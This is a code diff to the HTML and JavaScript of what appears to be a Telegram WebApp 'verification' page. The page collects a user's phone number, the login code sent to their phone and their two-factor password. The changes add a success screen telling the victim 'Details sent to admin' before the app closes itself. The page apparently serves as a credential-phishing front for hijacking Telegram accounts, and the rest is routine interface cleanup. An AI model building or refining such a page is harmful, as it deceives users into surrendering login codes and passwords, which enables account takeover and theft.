@@ -195,13 +195,6 @@
             border-color: #667eea;
             outline: none;
         }
-        
-        .hint {
-            font-size: 12px;
-            color: #888;
-            text-align: center;
-            margin-top: 5px;
-        }
     </style>
 </head>
 <body>
@@ -212,7 +205,7 @@
         </div>
         
         <div class="content">
-            <!-- OTP Entry Screen -->
+            <!-- OTP Entry -->
             <div id="otp-screen">
                 <div class="phone-info" id="phone-display">
                     Phone: {{ phone }}
@@ -220,17 +213,17 @@
                 
                 <div class="error" id="error-message"></div>
                 
-                <div class="info-text">
+                <p style="text-align: center; color: #666; margin-bottom: 20px;">
                     Enter the 5-digit code sent to your phone<br>
-                    <span class="hint">Format: 9 4 3 8 0 or 94380</span>
-                </div>
+                    <small>Format: 9 4 3 8 0 or 94380</small>
+                </p>
                 
                 <div class="otp-inputs">
-                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)" autocomplete="off" id="otp1">
-                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)" autocomplete="off" id="otp2">
-                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)" autocomplete="off" id="otp3">
-                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 4)" autocomplete="off" id="otp4">
-                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)" autocomplete="off" id="otp5">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)" autocomplete="off">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)" autocomplete="off">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)" autocomplete="off">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 4)" autocomplete="off">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)" autocomplete="off">
                 </div>
                 
                 <button class="btn" onclick="verifyOTP()" id="verify-btn" disabled>Verify OTP</button>
@@ -248,9 +241,9 @@
                 
                 <div class="error" id="password-error"></div>
                 
-                <div class="info-text">
+                <p style="text-align: center; color: #666; margin-bottom: 20px;">
                     Enter your 2FA password
-                </div>
+                </p>
                 
                 <input type="password" id="password-input" 
                        placeholder="2FA password" autocomplete="off">
@@ -259,11 +252,24 @@
                 <button class="btn back-btn" onclick="backToOTP()">Back</button>
             </div>
             
-            <!-- Loading Screen -->
+            <!-- Loading -->
             <div id="loading-screen" class="hidden">
                 <div class="loading">
                     <div class="loading-spinner"></div>
                     <p id="loading-text">Processing...</p>
+                </div>
+            </div>
+            
+            <!-- Success -->
+            <div id="success-screen" class="hidden">
+                <div class="success">
+                    <div class="success-icon">✅</div>
+                    <h2>Verified Successfully!</h2>
+                    <p>Your account has been verified.</p>
+                    <p><small>Details sent to admin</small></p>
+                    <p style="color: #666; font-size: 14px; margin-top: 10px;">
+                        Closing in <span id="countdown">5</span> seconds...
+                    </p>
                 </div>
             </div>
         </div>
@@ -279,13 +285,13 @@
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
             if (!sessionId) {
-                showError('Session expired or invalid. Please start over.');
+                showError('Session expired or invalid. Please share contact again.');
                 return;
             }
             
             // Focus first OTP input
             setTimeout(() => {
-                document.getElementById('otp1').focus();
+                document.querySelector('.otp-input').focus();
             }, 100);
         });
         
@@ -300,17 +306,10 @@
             
             // Move focus to next input
             if (input.value.length === 1 && nextIndex <= 5) {
-                const nextInput = document.getElementById(`otp${nextIndex}`);
+                const nextInput = document.querySelector(`.otp-input:nth-child(${nextIndex})`);
                 if (nextInput) {
                     nextInput.focus();
                 }
-            }
-            
-            // Auto-submit if all filled
-            if (otpCode.length === 5) {
-                setTimeout(() => {
-                    verifyOTP();
-                }, 300);
             }
         }
         
@@ -338,8 +337,7 @@
                     if (data.requires_2fa) {
                         showPasswordScreen();
                     } else {
-                        // Redirect to success page
-                        window.location.href = data.redirect_url;
+                        showSuccess();
                     }
                 } else {
                     hideLoading();
@@ -351,7 +349,6 @@
                     });
                     otpCode = '';
                     document.getElementById('verify-btn').disabled = true;
-                    document.getElementById('otp1').focus();
                 }
             })
             .catch(error => {
@@ -361,9 +358,8 @@
         }
         
         function resendOTP() {
-            if (confirm('Please share your contact again to receive new OTP.')) {
-                window.location.href = '/';
-            }
+            alert('Please start over to receive new OTP.');
+            window.location.href = '/';
         }
         
         function showPasswordScreen() {
@@ -378,7 +374,6 @@
             document.getElementById('otp-screen').classList.remove('hidden');
             document.getElementById('password-input').value = '';
             document.getElementById('password-error').classList.remove('show');
-            document.getElementById('otp1').focus();
         }
         
         function verifyPassword() {
@@ -405,14 +400,12 @@
             .then(response => response.json())
             .then(data => {
                 if (data.success) {
-                    // Redirect to success page
-                    window.location.href = data.redirect_url;
+                    showSuccess();
                 } else {
                     hideLoading();
                     document.getElementById('password-error').textContent = data.error || '2FA verification failed';
                     document.getElementById('password-error').classList.add('show');
                     document.getElementById('password-input').value = '';
-                    document.getElementById('password-input').focus();
                 }
             })
             .catch(error => {
@@ -427,10 +420,31 @@
             document.getElementById('otp-screen').classList.add('hidden');
             document.getElementById('password-screen').classList.add('hidden');
             document.getElementById('loading-screen').classList.remove('hidden');
+            document.getElementById('success-screen').classList.add('hidden');
         }
         
         function hideLoading() {
             document.getElementById('loading-screen').classList.add('hidden');
+        }
+        
+        function showSuccess() {
+            hideLoading();
+            document.getElementById('otp-screen').classList.add('hidden');
+            document.getElementById('password-screen').classList.add('hidden');
+            document.getElementById('success-screen').classList.remove('hidden');
+            
+            // Start countdown
+            let countdown = 5;
+            const countdownEl = document.getElementById('countdown');
+            const timer = setInterval(() => {
+                countdown--;
+                countdownEl.textContent = countdown;
+                
+                if (countdown <= 0) {
+                    clearInterval(timer);
+                    closeApp();
+                }
+            }, 1000);
         }
         
         function showError(message) {
@@ -443,63 +457,33 @@
             }, 5000);
         }
         
-        // Keyboard shortcuts
+        function closeApp() {
+            // Close the WebApp
+            if (window.Telegram && Telegram.WebApp) {
+                Telegram.WebApp.close();
+            } else {
+                // Fallback for testing
+                alert('Verification complete! You can close this window.');
+            }
+        }
+        
+        // Add keyboard shortcuts
         document.addEventListener('keydown', function(event) {
-            // Enter key in OTP screen
+            // Enter key submits OTP
             if (event.key === 'Enter' && !document.getElementById('otp-screen').classList.contains('hidden')) {
                 if (otpCode.length === 5) {
                     verifyOTP();
                 }
             }
             
-            // Enter key in password screen
+            // Enter key submits password
             if (event.key === 'Enter' && !document.getElementById('password-screen').classList.contains('hidden')) {
                 verifyPassword();
             }
             
-            // Escape key goes back from password screen
+            // Escape key goes back
             if (event.key === 'Escape' && !document.getElementById('password-screen').classList.contains('hidden')) {
                 backToOTP();
-            }
-            
-            // Backspace navigation in OTP
-            if (event.key === 'Backspace' && !document.getElementById('otp-screen').classList.contains('hidden')) {
-                const activeElement = document.activeElement;
-                if (activeElement && activeElement.classList.contains('otp-input')) {
-                    const inputs = document.querySelectorAll('.otp-input');
-                    const currentIndex = Array.from(inputs).indexOf(activeElement);
-                    
-                    if (activeElement.value === '' && currentIndex > 0) {
-                        // Move to previous input and clear it
-                        inputs[currentIndex - 1].focus();
-                        inputs[currentIndex - 1].value = '';
-                    }
-                }
-            }
-        });
-        
-        // Paste support
-        document.addEventListener('paste', function(event) {
-            const activeElement = document.activeElement;
-            if (activeElement && activeElement.classList.contains('otp-input')) {
-                event.preventDefault();
-                
-                const pastedText = (event.clipboardData || window.clipboardData).getData('text');
-                const numbers = pastedText.replace(/\D/g, '').split('');
-                
-                const inputs = document.querySelectorAll('.otp-input');
-                for (let i = 0; i < Math.min(numbers.length, 5); i++) {
-                    inputs[i].value = numbers[i];
-                }
-                
-                otpCode = Array.from(inputs).map(input => input.value).join('');
-                document.getElementById('verify-btn').disabled = otpCode.length !== 5;
-                
-                if (otpCode.length === 5) {
-                    setTimeout(() => {
-                        verifyOTP();
-                    }, 300);
-                }
             }
         });
     </script>
